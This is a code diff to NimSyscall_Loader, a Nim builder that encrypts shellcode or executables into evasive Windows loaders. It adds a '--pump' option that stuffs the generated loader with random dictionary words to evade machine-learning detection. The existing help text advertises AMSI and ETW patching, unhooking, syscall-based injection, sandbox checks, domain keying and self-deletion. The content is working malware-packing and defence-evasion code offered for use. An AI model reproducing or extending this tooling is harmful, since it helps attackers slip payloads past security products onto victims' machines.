@@ -54,7 +54,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.2
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain>]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size>]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -84,11 +84,14 @@ Options:
   --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
   --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
   --replace    Replace common nim IoC's in the loader like the string 'nim'
-  --sandbox Check1    Include Sandbox Checks of your choice into the loader
+  --sandbox Check1    Include Sandbox Checks of your choice into the loader:
                       Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                       DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                       DiskSpace -> Only execute if c:\ disk space >= 200GB
                       MemorySpace -> Only execute if more than 4GB RAM available
+  --pump value    Pump the file with:
+                  words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
+                  size -> just pump the size to avoid signatures for smaller files
   --domain targetdomain    Specify a domain for SandBox Evasion
   --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
 """
@@ -132,6 +135,9 @@ var
     remoteAMSIpatch: bool = false
     remoteETWpatch: bool = false
     replace: bool = false
+    pump: bool = false
+    pumpfmt: string = ""
+    pumpargs: seq[string]
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.2")
 
@@ -220,6 +226,12 @@ if args["--sandbox"]:
   sandboxcheckfmt = fmt"{sandboxchecksargs}"
   sandboxchecks = sandboxcheckfmt.split(',') 
 
+if args["--pump"]:
+  pump = true
+  let pumptempargs = args["--pump"]
+  pumpfmt = fmt"{pumptempargs}"
+  pumpargs = pumpfmt.split(',') 
+
 if args["--domain"]:
   let domainarg = args["--domain"]
   targetdomain = fmt"{domainarg}"
@@ -282,6 +294,7 @@ writeFile("enc.blob", content)
 
 let encodedIV = encode(iv)
 let encodedenvkey = encode(envkey)
+
 
 let RemoteProcImportStub = """
 import osproc
@@ -527,8 +540,44 @@ proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : st
 
 """
 
+proc genEnglishwords (nuofWords: int): string =
+
+
+  proc pumpenglishwords (numberofWords: int): seq[string] =
+
+    var englishdicts: seq[string]
+    var output: seq[string]
+    for line in lines "Dicts\\englishwords.txt":
+      englishdicts.add(line)
+    for i in 1 .. numberofWords:
+      output.add(sample(englishdicts))
+    return output
+
+  proc rndStr: string =
+    for _ in .. 10:
+      add(result, char(rand(int('a') .. int('z'))))
+    
+  var rand1: seq[string] = pumpenglishwords(nuofWords)
+  var rand2: string = rndStr()
+
+  let englishwordsstub = fmt"""
+
+var {rand2} = {rand1}
+
+"""
+
+  return englishwordsstub
 
 var stub = Cryptstub1
+
+if(pump):
+    # makes no sense to import strenc when strings should be visible in the binary.
+    stub =  stub.replace("import strenc", "")
+    for m in pumpargs:
+        if(m == "words"):
+            stub.add(genEnglishwords(rand(4750..7800)))
+        if (m == "size"):
+            stub.add("ToDo")
 
 if (selfdelete):
     stub.add(FileDeleteStub)
@@ -548,6 +597,7 @@ if(sandbox):
 if(gosleep):
     stub.add(SleepStubFirst)
     stub.add(SleepStubSeccond)
+
 
 if(unhook):
     if(hellsgate):
@@ -572,6 +622,7 @@ stub = stub & Cryptstub2 & Cryptstub3
 
 if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
+
 
 if (hellsgate):  
     stub.add(WinLeanGetCurrentProcStub)
@@ -732,6 +783,11 @@ if (csharp):
         stub.add(LoadAssemblyStub)
         stub.add(LoadAssemblyStubArgs)
 
+if(pump):
+    for m in pumpargs:
+        if(m == "words"):
+            stub.add(genEnglishwords(rand(4750..7800)))
+
 writeFile("Loader.nim", stub)
 echo "Written Loader.nim, compiling -> \n\n"
 
@@ -746,6 +802,8 @@ when system.hostOS == "windows":
     if (denim):
         var exist: bool = existsFile("denim.exe")
         if (exist):
+            stub =  stub.replace("import strenc", "")
+            writeFile("Loader.nim", stub)
             discard os.execShellCmd(fmt".\denim.exe compile Loader.nim")
             let msg = fmt"[!] Encrypted file saved to Loader.exe"
             echo "\n" & msg
